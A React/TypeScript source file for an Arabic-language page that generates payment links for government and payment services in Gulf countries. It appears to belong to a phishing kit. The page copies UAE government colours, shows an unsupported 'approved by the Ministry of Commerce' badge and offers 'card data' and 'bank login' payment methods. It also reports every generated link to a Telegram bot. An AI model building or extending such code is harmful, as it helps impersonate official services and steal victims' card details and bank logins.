import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getPaymentServicesByCountry } from "@/lib/gccPaymentServices";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency, getDefaultTitle } from "@/utils/countryData";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText, Shield, Lock as LockIcon } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreatePaymentLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const paymentServices = getPaymentServicesByCountry(country?.toUpperCase() || "");

  const [selectedService, setSelectedService] = useState("");
  const [paymentRef, setPaymentRef] = useState("");
  const [paymentDescription, setPaymentDescription] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);

  // Get banks for the selected country
  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);

  // Get selected service details and branding
  const selectedServiceData = useMemo(() =>
    paymentServices.find(s => s.key === selectedService),
    [paymentServices, selectedService]
  );

  const serviceBranding = useMemo(() => {
    if (!selectedService) return null;
    // Use custom branding for payment services
    return {
      logo: selectedServiceData?.logo || "",
      colors: {
        primary: selectedServiceData?.color || countryData?.primaryColor || "#0EA5E9",
        secondary: countryData?.secondaryColor || "#06B6D4"
      },
      description: selectedServiceData?.description || `خدمة ${selectedServiceData?.nameAr}`
    };
  }, [selectedService, selectedServiceData, countryData]);

  // UAE Government Color Scheme
  const uaeColors = {
    primary: "#CE1126",
    secondary: "#00732F",
    accent: "#000000",
    background: "#FFFFFF",
    lightGray: "#F5F5F5",
    border: "#E0E0E0",
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !paymentRef) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "payment",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.nameAr || selectedService,
          payment_reference: paymentRef,
          payment_description: paymentDescription,
          payment_amount: parseFloat(paymentAmount) || 500,
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
        },
      });

      // Generate unified payment URL using the new function
      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA'
      });

      // Send data to Telegram with image and description
      const telegramResult = await sendToTelegram({
        message: `🔔 رابط سداد جديد\n\n🏢 الخدمة: ${selectedServiceData?.nameAr}\n💰 المبلغ: ${formatCurrency(parseFloat(paymentAmount) || 500, country || "SA")}\n🆔 المرجع: ${paymentRef}\n\n🌍 الدولة: ${countryData?.nameAr}\n\n🔗 الرابط: ${paymentUrl}`,
        linkUrl: paymentUrl,
        imageUrl: serviceBranding?.logo || "",
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      toast({
        title: "تم إنشاء رابط السداد بنجاح!",
        description: "يمكنك الآن مشاركة الرابط مع العميل",
      });
    } catch (error) {
      console.error("Error creating payment link:", error);
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط السداد",
        variant: "destructive",
      });
    }
  };

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(createdPaymentUrl);
      setCopied(true);
      toast({
        title: "تم النسخ!",
        description: "تم نسخ رابط السداد إلى الحافظة",
      });
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      toast({
        title: "خطأ",
        description: "فشل في نسخ الرابط",
        variant: "destructive",
      });
    }
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <CreditCard className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
      {/* Header */}
      <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
                <CreditCard className="w-6 h-6" style={{ color: uaeColors.primary }} />
              </div>
              <div className="text-white">
                <h1 className="text-lg font-bold">إنشاء رابط سداد</h1>
                <p className="text-xs opacity-90">{countryData?.nameAr || ''}</p>
              </div>
            </div>
            <Badge variant="secondary" className="bg-white text-gray-800">
              <LockIcon className="w-3 h-3 ml-1" />
              اتصال آمن
            </Badge>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-3xl mx-auto">
          {/* Telegram Test Component */}
          <div className="mb-6">
            <TelegramTest />
          </div>

          {/* Security Notice */}
          <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: uaeColors.secondary }}>
            <div className="flex items-start gap-3">
              <Shield className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
              <div>
                <h3 className="font-semibold text-sm mb-1">إنشاء رابط سداد آمن</h3>
                <p className="text-xs text-gray-600">
                  قم بإنشاء روابط سداد آمنة للخدمات الحكومية والعامة
                </p>
              </div>
            </div>
          </div>

          <div className="bg-white rounded-lg shadow-lg border-0 overflow-hidden">
            {/* Header */}
            <div
              className="p-6 border-b"
              style={{ backgroundColor: uaeColors.lightGray }}
            >
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-xl font-bold mb-1" style={{ color: uaeColors.accent }}>
                    إنشاء رابط سداد جديد
                  </h2>
                  <p className="text-sm text-gray-600">{countryData?.nameAr}</p>
                </div>
                <div
                  className="w-16 h-16 rounded-xl flex items-center justify-center"
                  style={{ backgroundColor: `${uaeColors.primary}15` }}
                >
                  <Building2 className="w-8 h-8" style={{ color: uaeColors.primary }} />
                </div>
              </div>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="p-6 space-y-5">
              {/* Payment Service Selection */}
              <div>
                <Label className="mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                  خدمة السداد *
                </Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
                    <SelectValue placeholder="اختر خدمة السداد" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {paymentServices.map((service) => (
                      <SelectItem key={service.id} value={service.key}>
                        {service.nameAr}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {/* Service Logo and Description */}
              {selectedService && serviceBranding && selectedServiceData && (
                <div className="p-4 rounded-lg border" style={{ backgroundColor: uaeColors.lightGray, borderColor: uaeColors.border }}>
                  <div className="flex items-center gap-3 mb-2">
                    {serviceBranding.logo && (
                      <img
                        src={serviceBranding.logo}
                        alt={selectedServiceData.nameAr}
                        className="h-8 object-contain"
                        onError={(e) => {
                          e.currentTarget.style.display = 'none';
                        }}
                      />
                    )}
                    <div>
                      <h3 className="font-semibold text-sm" style={{ color: uaeColors.accent }}>
                        {selectedServiceData.nameAr}
                      </h3>
                      <p className="text-xs text-gray-600">{selectedServiceData.category}</p>
                    </div>
                  </div>
                  <p className="text-xs text-gray-600">{serviceBranding.description}</p>
                </div>
              )}

              {/* Payment Reference */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                  <Hash className="w-4 h-4" />
                  رقم أو مرجع الدفع *
                </Label>
                <Input
                  value={paymentRef}
                  onChange={(e) => setPaymentRef(e.target.value)}
                  placeholder="مثال: INV-12345, PAY-67890"
                  className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                  required
                />
              </div>

              {/* Payment Description */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                  <FileText className="w-4 h-4" />
                  وصف الدفع
                </Label>
                <Input
                  value={paymentDescription}
                  onChange={(e) => setPaymentDescription(e.target.value)}
                  placeholder="مثال: رسوم خدمات، اشتراك، فاتورة"
                  className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                />
              </div>

              {/* Payment Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                  <DollarSign className="w-4 h-4" />
                  مبلغ السداد
                  {country && (
                    <span className="text-xs text-gray-600">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={paymentAmount}
                  onChange={(e) => setPaymentAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-gray-600 mt-2">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>

              {/* Payment Method Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                  <CreditCard className="w-4 h-4" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                    {selectedServiceData?.category === 'bank' && (
                      <SelectItem value="bank_login">
                        <div className="flex items-center gap-2">
                          <Building2 className="w-4 h-4" />
                          <span>الدفع المصرفي</span>
                        </div>
                      </SelectItem>
                    )}
                  </SelectContent>
                </Select>
              </div>

              {/* Bank Selection (only if bank_login selected) */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.id}>
                          {bank.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              )}

              {/* Security Info */}
              <div className="mt-6 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
                <div className="flex items-start gap-3">
                  <Shield className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
                  <div>
                    <h4 className="font-semibold text-sm mb-1" style={{ color: uaeColors.accent }}>
                      محمي بتشفير SSL
                    </h4>
                    <p className="text-xs text-gray-600">
                      جميع روابط السداد محمية ومشفرة بأعلى معايير الأمان
                    </p>
                  </div>
                </div>
              </div>

              <Button
                type="submit"
                size="lg"
                className="w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90"
                style={{ backgroundColor: uaeColors.primary }}
                disabled={createLink.isPending}
              >
                {createLink.isPending ? "جاري الإنشاء..." : "إنشاء رابط السداد"}
              </Button>
            </form>
          </div>

          {/* Security Footer */}
          <div className="mt-6 text-center">
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
              <Shield className="w-4 h-4" style={{ color: uaeColors.secondary }} />
              <span className="text-xs font-medium" style={{ color: uaeColors.accent }}>
                معتمد من وزارة التجارة
              </span>
            </div>
          </div>
        </div>

        {/* Success Dialog */}
        <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
          <AlertDialogContent className="sm:max-w-md" dir="rtl">
            <AlertDialogHeader>
              <AlertDialogTitle className="text-right">✅ تم إنشاء رابط السداد بنجاح!</AlertDialogTitle>
              <AlertDialogDescription className="text-right">
                يمكنك الآن مشاركة هذا الرابط مع العميل لدفع المبلغ المطلوب
              </AlertDialogDescription>
            </AlertDialogHeader>
            <div className="my-4">
              <Label className="text-sm font-semibold">رابط السداد</Label>
              <div className="flex items-center gap-2 mt-2">
                <Input
                  value={createdPaymentUrl}
                  readOnly
                  className="text-sm h-10 font-mono"
                />
                <Button
                  variant="outline"
                  size="icon"
                  onClick={copyToClipboard}
                  className="shrink-0"
                >
                  <Copy className="h-4 w-4" />
                </Button>
              </div>
              <p className="text-xs text-muted-foreground mt-2">
                {copied ? "✓ تم النسخ" : "انقر لنسخ الرابط"}
              </p>
            </div>
            <AlertDialogFooter className="flex flex-row gap-2 justify-start">
              <Button
                variant="outline"
                onClick={() => window.open(createdPaymentUrl, '_blank')}
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة الرابط
              </Button>
              <AlertDialogAction
                onClick={() => {
                  setShowSuccessDialog(false);
                  navigate('/services');
                }}
                className="flex-1"
              >
                إنشاء رابط آخر
              </AlertDialogAction>
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialog>
      </div>
    </div>
  );
};

export default CreatePaymentLink;
